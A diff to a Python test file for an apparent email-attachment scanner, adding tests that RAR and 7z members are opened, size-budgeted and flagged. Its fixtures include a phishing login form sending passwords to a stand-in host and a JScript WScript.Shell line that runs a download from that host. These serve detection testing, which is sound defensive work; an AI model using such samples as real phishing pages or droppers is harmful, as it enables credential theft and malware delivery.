@@ -169,8 +169,21 @@ def test_disk_readers_survive_garbage():
 # ----------------------------------------------------------------- archives --
 
 def test_a_rar_listing_shows_the_payload():
-    a = attach(fb.rar5(["docs/Invoice.pdf.lnk", "readme.txt"]), "Invoice.rar")
+    # Compressed members cannot be read (RAR's compression is proprietary): the name is the evidence.
+    data = fb.rar5(["docs/Invoice.pdf.lnk", "readme.txt"], contents={"docs/Invoice.pdf.lnk": b"\x01" * 40},
+                   compressed=True)
+    a = attach(data, "Invoice.rar")
     assert severity(a, "RAR archive Invoice.rar holds docs/Invoice.pdf.lnk") == ["high"]
+    assert a.attachments[0].archive["skipped"] == 2
+
+
+def test_stored_rar_members_are_opened():
+    page = b'<html><form action="https://kit.top/p.php"><input type="password" name="pw"></form></html>'
+    a = attach(fb.rar5(["login.html", "readme.txt"], contents={"login.html": page}), "Invoice.rar")
+    member = next(f for f in a.attachments if f.filename == "login.html")
+    assert member.parent == "Invoice.rar" and member.size == len(page)
+    assert any("credential form" in label and "login.html" in label for label in labels(a))
+    assert "kit[.]top" in " ".join(labels(a)) or any(u.host == "kit.top" for u in a.urls)
 
 
 def test_an_archive_that_encrypts_its_names():
@@ -180,7 +193,28 @@ def test_an_archive_that_encrypts_its_names():
 
 def test_a_7z_listing_shows_the_payload():
     a = attach(fb.seven_zip(["Invoice.pdf.js", "logo.png"]), "Invoice.7z")
-    assert any("7Z archive Invoice.7z holds Invoice.pdf.js" in label for label in labels(a))
+    assert any("Invoice.pdf.js (inside Invoice.7z)" in label for label in labels(a))
+
+
+@pytest.mark.parametrize("bcj", [False, True])
+def test_7z_members_are_decompressed_and_inspected(bcj):
+    script = b"var s = new ActiveXObject('WScript.Shell'); s.Run('https://kit.top/dl.exe');\n" * 30
+    files = {"Invoice.pdf.js": script, "setup.exe": b"MZ\x90\x00" + bytes(range(256)) * 40}
+    a = attach(fb.seven_zip_packed(files, bcj=bcj), "Invoice.7z")
+    members = {f.filename: f for f in a.attachments if f.parent == "Invoice.7z"}
+    assert set(members) == set(files)
+    assert members["setup.exe"].true_type == "pe" and members["Invoice.pdf.js"].size == len(script)
+    assert severity(a, "risky attachment: Invoice.pdf.js (inside Invoice.7z)") == ["high"]
+    assert severity(a, "double extension: Invoice.pdf.js (inside Invoice.7z)") == ["high"]
+    assert a.attachments[0].archive["skipped"] == 0
+
+
+def test_7z_extraction_stops_at_the_budget():
+    files = {"a.bin": b"\0" * 4096, "b.bin": b"\1" * 4096}
+    listing = archives.list_7z(fb.seven_zip_packed(files), budget=4096)
+    assert listing.names == ["a.bin", "b.bin"] and listing.contents == [None, None]  # one folder: all or nothing
+    listing = archives.list_7z(fb.seven_zip_packed(files), budget=8192)
+    assert listing.contents == [b"\0" * 4096, b"\1" * 4096]
 
 
 def test_rar_and_7z_readers_refuse_garbage():
